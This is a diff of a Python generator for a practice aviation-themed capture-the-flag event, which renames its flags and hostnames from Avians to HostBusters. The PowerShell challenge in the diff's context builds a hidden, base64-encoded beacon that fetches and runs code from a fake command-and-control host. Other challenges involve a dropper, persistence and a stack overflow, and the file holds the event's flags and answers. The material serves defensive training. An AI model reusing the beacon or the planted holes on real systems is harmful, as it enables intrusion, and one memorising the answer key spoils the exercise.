@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Generate every challenge file for the Avians practice CTF.
+"""Generate every challenge file for the HostBusters practice CTF.
 
     python3 generator/build.py
 
@@ -75,7 +75,7 @@ def shared_wordlist():
              "wilco", "clearance", "approach", "takeoff", "brussels", "zaventem", "pilot", "captain",
              "copilot", "airport", "jetstream", "contrail", "turbine", "propeller", "fuselage",
              "cargo", "baggage", "boarding", "gate", "terminal", "radar", "tower", "atc", "eurocontrol",
-             "skyteam", "avians", "falcon", "eagle", "condor", "albatross", "pelican", "swallow"]
+             "skyteam", "hostbusters", "falcon", "eagle", "condor", "albatross", "pelican", "swallow"]
     out = set()
     for w in words:
         out.add(w)
@@ -102,12 +102,12 @@ def shared_wordlist():
 # ---------------------------------------------------------------------------
 def c_boarding_pass():
     cid = "01-boarding-pass"
-    fl = "AVIANS{welcome_aboard_cleared_for_takeoff}"
+    fl = "HOSTBUSTERS{welcome_aboard_cleared_for_takeoff}"
     flag(cid, fl)
     encoded = base64.b64encode(fl.encode()).decode()
     wtext(cid, "boarding_pass.txt", f"""\
 ================================================================
-  AVIANS PRACTICE AIRLINES                 BOARDING PASS
+  HOSTBUSTERS PRACTICE AIRLINES                 BOARDING PASS
 ================================================================
   PASSENGER : DEFENDER/BLUE TEAM MR
   FLIGHT    : AV1337        DATE : 30NOV26
@@ -127,7 +127,7 @@ def c_boarding_pass():
 # ---------------------------------------------------------------------------
 def c_mystery_cargo():
     cid = "02-mystery-cargo"
-    fl = "AVIANS{file_extensions_lie}"
+    fl = "HOSTBUSTERS{file_extensions_lie}"
     flag(cid, fl)
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
@@ -143,12 +143,12 @@ def c_mystery_cargo():
 # ---------------------------------------------------------------------------
 def c_fmc_firmware():
     cid = "03-fmc-firmware"
-    fl = "AVIANS{fmc_str1ngs_n0t_s0_h1dden}"
+    fl = "HOSTBUSTERS{fmc_str1ngs_n0t_s0_h1dden}"
     flag(cid, fl)
     blob = bytearray()
     rnd = random.Random(42)
     blob += b"\x7fELF\x02\x01\x01" + bytes(rnd.getrandbits(8) for _ in range(4000))
-    blob += b"FMC-OS v4.2.1 (c) Avians Avionics\x00"
+    blob += b"FMC-OS v4.2.1 (c) HostBusters Avionics\x00"
     blob += bytes(rnd.getrandbits(8) for _ in range(9000))
     blob += b"/usr/lib/navdb/AIRAC2611.dat\x00"
     blob += bytes(rnd.getrandbits(8) for _ in range(7000))
@@ -156,7 +156,7 @@ def c_fmc_firmware():
     blob += bytes(rnd.getrandbits(8) for _ in range(12000))
     blob += b"ERROR: ARINC 429 bus timeout on label 310\x00"
     blob += bytes(rnd.getrandbits(8) for _ in range(6000))
-    blob += b"AVIANS{this_is_a_decoy_flag}"[:20] + b"\x00"  # truncated decoy, not a valid flag
+    blob += b"HOSTBUSTERS{this_is_a_decoy_flag}"[:20] + b"\x00"  # truncated decoy, not a valid flag
     blob += bytes(rnd.getrandbits(8) for _ in range(3000))
     wbin(cid, "fmc_firmware.bin", bytes(blob))
 
@@ -167,12 +167,12 @@ def c_fmc_firmware():
 def c_ftp():
     cid = "04-ftp-ground-ops"
     password = "Tarmac#Brussels26"
-    fl = "AVIANS{" + password + "}"
+    fl = "HOSTBUSTERS{" + password + "}"
     flag(cid, fl)
     p = Pcap(T0 + 3600 * 2)
     # some background noise: DNS + a short HTTP
     for i in range(6):
-        q = random.choice(["weather.avians.local", "ops-portal.avians.local", "time.avians.local", "ntp.avians.local"])
+        q = random.choice(["weather.hostbusters.local", "ops-portal.hostbusters.local", "time.hostbusters.local", "ntp.hostbusters.local"])
         qid = random.randint(1, 65000)
         p.udp("10.10.20.15", 50000 + i, "10.10.0.2", 53, dns_query(qid, q), dt=0.4)
         p.udp("10.10.0.2", 53, "10.10.20.15", 50000 + i, dns_response(qid, q, "10.10.0.%d" % (20 + i)), dt=0.002)
@@ -219,14 +219,14 @@ def http_get(p, cip, cport, sip, host, path, body, ctype="text/html"):
 
 def c_manifest_exfil():
     cid = "05-manifest-exfil"
-    fl = "AVIANS{manifest_left_the_building}"
+    fl = "HOSTBUSTERS{manifest_left_the_building}"
     flag(cid, fl)
     p = Pcap(T0 + 3600 * 5)
     client = "10.20.30.44"
     for i in range(5):
-        http_get(p, client, 52000 + i, "10.20.0.80", "intranet.avians.local", random.choice(
+        http_get(p, client, 52000 + i, "10.20.0.80", "intranet.hostbusters.local", random.choice(
             ["/", "/news", "/roster", "/fuel", "/weather/METAR/EBBR"]),
-            b"<html><body><h1>Avians intranet</h1><p>Nothing to see here.</p></body></html>")
+            b"<html><body><h1>HostBusters intranet</h1><p>Nothing to see here.</p></body></html>")
         p.advance(random.uniform(2, 8))
     rows = ["pnr,last_name,first_name,seat,flight,date,doc_number"]
     for i in range(40):
@@ -247,7 +247,7 @@ def c_manifest_exfil():
     s.close()
     for i in range(3):
         p.advance(random.uniform(2, 8))
-        http_get(p, client, 52200 + i, "10.20.0.80", "intranet.avians.local", "/roster",
+        http_get(p, client, 52200 + i, "10.20.0.80", "intranet.hostbusters.local", "/roster",
                  b"<html><body><h1>Crew roster</h1></body></html>")
     p.save(os.path.join(cdir(cid), "terminal_b_workstation.pcap"))
 
@@ -257,7 +257,7 @@ def c_manifest_exfil():
 # ---------------------------------------------------------------------------
 def c_dns():
     cid = "06-dns-contrails"
-    fl = "AVIANS{dns_tunnels_fly_under_radar}"
+    fl = "HOSTBUSTERS{dns_tunnels_fly_under_radar}"
     flag(cid, fl)
     p = Pcap(T0 + 3600 * 7)
     client, resolver = "10.30.1.17", "10.30.0.53"
@@ -297,7 +297,7 @@ def c_dns():
 def c_scan():
     cid = "07-radar-sweep"
     scanner, target = "203.0.113.66", "10.40.0.12"
-    fl = "AVIANS{203.0.113.66:502}"
+    fl = "HOSTBUSTERS{203.0.113.66:502}"
     flag(cid, fl)
     p = Pcap(T0 + 3600 * 9)
     # background: legit monitoring traffic to port 443
@@ -339,7 +339,7 @@ def c_scan():
 def c_bruteforce():
     cid = "08-brute-force-at-the-gate"
     attacker, user = "198.51.100.23", "opsadmin"
-    fl = f"AVIANS{{{attacker}_{user}}}"
+    fl = f"HOSTBUSTERS{{{attacker}_{user}}}"
     flag(cid, fl)
     lines = []
     t = BASE.replace(hour=0)
@@ -397,7 +397,7 @@ def c_bruteforce():
 # ---------------------------------------------------------------------------
 def c_sqli():
     cid = "09-booking-site-sqli"
-    fl = "AVIANS{crew_accounts}"
+    fl = "HOSTBUSTERS{crew_accounts}"
     flag(cid, fl)
     from urllib.parse import quote
     lines = []
@@ -437,7 +437,7 @@ def c_sqli():
 # ---------------------------------------------------------------------------
 def c_powershell():
     cid = "10-powershell-on-the-tarmac"
-    fl = "AVIANS{utf16_base64_powershell_unmasked}"
+    fl = "HOSTBUSTERS{utf16_base64_powershell_unmasked}"
     flag(cid, fl)
     script = ("$c2='http://efb-sync-update.com/api/v2/beacon';"
               "$id=$env:COMPUTERNAME;"
@@ -445,7 +445,7 @@ def c_powershell():
               "while($true){$r=Invoke-WebRequest -UseBasicParsing \"$c2?h=$id\";"
               "if($r.Content){iex $r.Content};Start-Sleep -s 60}")
     enc = base64.b64encode(script.encode("utf-16-le")).decode()
-    host = "GND-OPS-WS07.avians.local"
+    host = "GND-OPS-WS07.hostbusters.local"
     procs = [("C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe"),
              ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
              ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "\"chrome.exe\" --type=renderer"),
@@ -458,14 +458,14 @@ def c_powershell():
     for i in range(400):
         img, cmd = random.choice(procs)
         evts.append({"EventID": 1, "UtcTime": (t + timedelta(seconds=random.randint(0, 30000))).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
-                     "Computer": host, "User": "AVIANS\\j.peeters", "Image": img, "CommandLine": cmd,
+                     "Computer": host, "User": "HOSTBUSTERS\\j.peeters", "Image": img, "CommandLine": cmd,
                      "ParentImage": "C:\\Windows\\explorer.exe", "ProcessId": random.randint(1000, 15000)})
     for i in range(150):
         evts.append({"EventID": 3, "UtcTime": (t + timedelta(seconds=random.randint(0, 30000))).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                      "Computer": host, "Image": random.choice(procs)[0], "DestinationIp": "10.60.%d.%d" % (random.randint(0, 5), random.randint(2, 250)),
                      "DestinationPort": random.choice([443, 445, 389, 53, 88])})
     bad_t = t + timedelta(seconds=14321)
-    evts.append({"EventID": 1, "UtcTime": bad_t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "Computer": host, "User": "AVIANS\\j.peeters",
+    evts.append({"EventID": 1, "UtcTime": bad_t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "Computer": host, "User": "HOSTBUSTERS\\j.peeters",
                  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  "CommandLine": "powershell.exe -nop -w hidden -enc " + enc,
                  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ProcessId": 6644})
@@ -486,9 +486,9 @@ def c_powershell():
 def c_adsb():
     cid_g, cid_s = "11-ghost-flight", "12-supersonic-cessna"
     ghost = "XAV1337"
-    flag(cid_g, "AVIANS{" + ghost + "}")
+    flag(cid_g, "HOSTBUSTERS{" + ghost + "}")
     fast_icao = 0x4B1A2F
-    flag(cid_s, "AVIANS{4B1A2F}")
+    flag(cid_s, "HOSTBUSTERS{4B1A2F}")
     fleet = []
     used = set()
     types = ["A320", "A20N", "B738", "A319", "E190", "B38M", "A321", "CRJ9", "AT76", "DH8D"]
@@ -540,7 +540,7 @@ def c_adsb():
 # ---------------------------------------------------------------------------
 def c_squawk():
     cid = "13-squawk-alert"
-    fl = "AVIANS{BEL3KX}"
+    fl = "HOSTBUSTERS{BEL3KX}"
     flag(cid, fl)
     rows = ["utc_time,icao24,callsign,squawk,alt_ft,gs_kt,lat,lon"]
     fl_list = []
@@ -570,7 +570,7 @@ def c_squawk():
 # ---------------------------------------------------------------------------
 def c_acars():
     cid = "14-acars-chatter"
-    fl = "AVIANS{acars_is_not_encrypted}"
+    fl = "HOSTBUSTERS{acars_is_not_encrypted}"
     flag(cid, fl)
     labels = {"H1": "Message to/from terminal", "_d": "General response", "Q0": "Link test", "SA": "Media advisory",
               "5Z": "Airline designated downlink", "80": "Airline designated (OOOI)", "QA": "OUT time", "B9": "ATIS request"}
@@ -619,7 +619,7 @@ def deg2nmea(v, lat=True):
 
 def c_gnss():
     cid = "15-gnss-spoofing"
-    fl = "AVIANS{142317}"
+    fl = "HOSTBUSTERS{142317}"
     flag(cid, fl)
     lines = []
     lat, lon = 50.9010, 4.4844   # near EBBR
@@ -681,7 +681,7 @@ def sky(x, y):
 
 def c_cockpit_selfie():
     cid = "16-cockpit-selfie"
-    fl = "AVIANS{metadata_tells_all}"
+    fl = "HOSTBUSTERS{metadata_tells_all}"
     flag(cid, fl)
     data = png_bytes(320, 200, sky, [("Author", "F/O K. Wouters"), ("Software", "SkyCam 2.1"),
                                       ("Description", "Final approach RWY 25L EBBR, sunset"),
@@ -691,7 +691,7 @@ def c_cockpit_selfie():
 
 def c_stowaway():
     cid = "17-stowaway"
-    fl = "AVIANS{binwalk_found_the_stowaway}"
+    fl = "HOSTBUSTERS{binwalk_found_the_stowaway}"
     flag(cid, fl)
     img = png_bytes(320, 200, lambda x, y: (40 + y // 4, 40 + y // 4, 60 + y // 3))
     buf = io.BytesIO()
@@ -702,7 +702,7 @@ def c_stowaway():
 
 def c_locked_bag(wordlist):
     cid = "18-locked-flight-bag"
-    fl = "AVIANS{john_cracked_the_bag}"
+    fl = "HOSTBUSTERS{john_cracked_the_bag}"
     flag(cid, fl)
     pw = "Skyhawk172"
     assert pw in wordlist
@@ -721,7 +721,7 @@ def c_crew_hashes(wordlist):
     cid = "19-crew-hashes"
     target_pw = "landinggear7"
     assert target_pw in wordlist
-    fl = "AVIANS{" + target_pw + "}"
+    fl = "HOSTBUSTERS{" + target_pw + "}"
     flag(cid, fl)
     users = {"capt.lambert": target_pw, "fo.mertens": "Runway2026", "cc.jacobs": "x9$Lq!vP2#rT8mZw",
              "eng.claes": "turbine123", "disp.goossens": "Gk7&pWz!q2Lm9#Rt"}
@@ -736,7 +736,7 @@ def c_crew_hashes(wordlist):
 # ---------------------------------------------------------------------------
 def c_dropper():
     cid = "20-baggage-dropper"
-    fl = "AVIANS{never_run_what_you_cannot_read}"
+    fl = "HOSTBUSTERS{never_run_what_you_cannot_read}"
     flag(cid, fl)
     inner = f"""#!/bin/bash
 # stage 2
@@ -764,7 +764,7 @@ echo "[+] conveyor firmware updated"
 # ---------------------------------------------------------------------------
 def c_yara():
     cid = "21-yara-hunt"
-    flag(cid, "AVIANS{sample_31}")
+    flag(cid, "HOSTBUSTERS{sample_31}")
     d = os.path.join(cdir(cid), "samples")
     os.makedirs(d, exist_ok=True)
     rnd = random.Random(7)
@@ -805,7 +805,7 @@ Find the JackalLoader sample.
 # ---------------------------------------------------------------------------
 def c_persistence():
     cid = "22-persistence-hunt"
-    fl = "AVIANS{hunt_cron_systemd_and_ssh_keys}"
+    fl = "HOSTBUSTERS{hunt_cron_systemd_and_ssh_keys}"
     flag(cid, fl)
     p1, p2, p3 = fl[:14], fl[14:27], fl[27:]
     files = {
@@ -847,7 +847,7 @@ def c_persistence():
 # ---------------------------------------------------------------------------
 def c_xor():
     cid = "23-xor-atis"
-    fl = "AVIANS{x0r_is_not_encryption}"
+    fl = "HOSTBUSTERS{x0r_is_not_encryption}"
     flag(cid, fl)
     plain = ("ATIS BROADCAST EBBR -- FOR TRAINING ONLY\n"
              "Runway 25L/25R in use. Wind 240 at 12 knots.\n"
@@ -866,7 +866,7 @@ def c_xor():
 # ---------------------------------------------------------------------------
 def c_rsa():
     cid = "24-weak-crew-pki"
-    fl = "AVIANS{factordb_breaks_small_rsa}"
+    fl = "HOSTBUSTERS{factordb_breaks_small_rsa}"
     flag(cid, fl)
     import sympy
     rnd = random.Random(2024)
@@ -896,7 +896,7 @@ def c_jwt(wordlist):
     cid = "25-crew-portal-jwt"
     secret = "jetstream2026"
     assert secret in wordlist
-    fl = "AVIANS{" + secret + "}"
+    fl = "HOSTBUSTERS{" + secret + "}"
     flag(cid, fl)
     import jwt as _jwt
     token = _jwt.encode({"sub": "guest", "role": "viewer", "iss": "crewportal",
@@ -928,7 +928,7 @@ def _compile(cid, src, outname):
 def c_re_keypad():
     cid = "26-hangar-keypad"
     password = "OpenSesame172"
-    fl = "AVIANS{static_re_beats_the_keypad}"
+    fl = "HOSTBUSTERS{static_re_beats_the_keypad}"
     flag(cid, fl)
     k = 0x5A
     enc_fl = bytes(b ^ k for b in fl.encode()) + b"\x00"
@@ -964,7 +964,7 @@ int main(){{
 # 27 Pwn: stack buffer overflow to reach a hidden function
 def c_pwn_jetway():
     cid = "27-jetway-overflow"
-    fl = "AVIANS{smashed_the_jetway_stack}"
+    fl = "HOSTBUSTERS{smashed_the_jetway_stack}"
     flag(cid, fl)
     enc_fl = bytes(b ^ 0x5A for b in fl.encode()) + b"\x00"
     src = f"""#include <stdio.h>
@@ -1042,7 +1042,7 @@ def main():
         f.write("SPOILERS! All flags.\n\n" + "\n".join(f"{k}: {v}" for k, v in FLAGS.items()) + "\n")
 
     # one zip with everything for easy download
-    pack = os.path.join(OUT, "avians-ctf-pack.zip")
+    pack = os.path.join(OUT, "hostbusters-ctf-pack.zip")
     with zipfile.ZipFile(pack, "w", zipfile.ZIP_DEFLATED) as z:
         for dp, _, fns in os.walk(OUT):
             for fn in fns:
